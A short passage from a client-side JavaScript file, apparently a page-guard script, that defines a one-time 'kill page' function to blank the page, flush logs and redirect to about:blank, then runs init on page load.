  window.__VG_KILLPAGE = function (reason) {
    if (window.__VG_KILLPAGE_DONE) return;
    window.__VG_KILLPAGE_DONE = true;

    try {
      document.open();
      document.write('');
      document.close();
    } catch (e) {}

    try { flushLogs(); } catch (e) {}

    setTimeout(function () {
      try { window.location.replace('about:blank'); } catch (e) {}
    }, 400);
  };

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
